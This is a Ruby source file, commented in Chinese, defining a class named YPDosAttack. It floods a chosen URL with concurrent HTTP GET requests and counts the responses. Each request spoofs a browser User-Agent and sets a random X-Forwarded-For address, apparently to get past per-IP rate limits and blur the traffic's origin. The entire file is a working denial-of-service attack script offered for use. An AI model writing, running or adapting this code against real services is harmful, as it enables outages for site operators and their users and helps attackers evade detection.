require 'net/http'
require 'uri'

class YPDosAttack
    def self.dosattack(argvs)
        url = argvs[1]
        request_count = argvs[2]

        uri = URI(url) # 修改为你想要请求的网址

        n = 10 # 发送 10 个请求
        concurrency = 5 # 使用 5 个线程
        if request_count
            n = request_count.to_i
        end
        
        success_count = 0 # 计数器，记录成功次数
        failure_count = 0 # 计数器，记录失败次数
        
        mutex = Mutex.new # 互斥锁，用于对计数器的操作加锁
        
        responses = Array.new(n) # 用于保存响应结果的数组
        
        threads = []
        
        n.times do |i|
          threads << Thread.new do
            begin
              req = Net::HTTP::Get.new(uri)
              req['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3' # 添加 User-Agent 请求头
              ip_address = Array.new(4) { rand(256) }.join('.')
              req['X-Forwarded-For'] = ip_address
              # req['X-Forwarded-For'] = '192.168.0.1' # 将 X-Forwarded-For 请求头设置为你想要使用的 IP 地址
              response = Net::HTTP.start(uri.hostname, uri.port, use_ssl: uri.scheme == 'https') do |http|
                http.request(req)
              end
              mutex.synchronize do
                if response.is_a?(Net::HTTPSuccess)
                  success_count += 1
                else
                  failure_count += 1
                end
              end
              puts "当前请求结果 #{response.code} #{response.message}" + " -------- #{failure_count + success_count}"
            rescue StandardError => e
              failure_count += 1
              puts "当前请求结果 #{e}" + " -------- #{failure_count + success_count}"
            end
          end
        
          threads.pop(concurrency - 1).each(&:join) if threads.size >= concurrency
        end
        
        threads.each(&:join)
        
        puts "成功次数: #{success_count}，失败次数: #{failure_count}"

    end
end
